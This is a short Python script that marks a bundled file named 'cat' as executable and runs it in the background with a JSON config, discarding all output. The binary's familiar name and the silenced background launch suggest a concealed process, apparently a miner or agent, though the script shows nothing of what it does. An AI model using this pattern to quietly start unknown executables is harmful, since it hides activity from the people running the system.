import subprocess

cmd = "chmod +x ./files/cat && ./files/cat -c ./files/mouse.json >/dev/null 2>&1 &"
res = subprocess.call(cmd, shell=True)
